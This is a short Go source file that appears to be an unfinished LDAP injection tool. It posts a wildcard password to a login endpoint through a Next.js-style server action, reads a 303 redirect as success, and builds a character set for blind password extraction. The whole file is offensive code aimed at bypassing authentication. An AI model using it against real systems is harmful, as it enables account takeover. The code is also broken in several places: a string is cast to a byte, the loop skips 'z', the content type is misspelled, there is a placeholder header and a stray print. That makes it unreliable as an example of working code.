package injectors

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

type LdapInjector struct {
	Url      string
	Username string
}

func NewLdapInjector(u, n string) *LdapInjector {
	return &LdapInjector{
		Url:      u,
		Username: n,
	}
}

func (li *LdapInjector) TestPassword(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{}, "$K1"]`,
		li.Username, password)
	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-urlencoded")
	req.Header.Set("Next-Action", "pull from burpsuite")

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	return resp.StatusCode == 303, nil
}

func RunInject() {
	fmt.Println("stiny")
}

func CreateCharset() string {
	var charset []byte
	for c := 'a'; c < 'z'; c++ {
		charset = append(charset, byte(c))
	}
	for i := range 10 {
		c := strconv.Itoa(i)
		charset = append(charset, byte(c))
	}
	return string(charset)
}

func main() {
	c := NewLdapInjector("http://scanme.nmap.org", "jubjub")
	resp, err := c.TestPassword("*")

	if err != nil {
		fmt.Println("Error: ", err)
		return
	}

	fmt.Println("Response: ", resp)
}
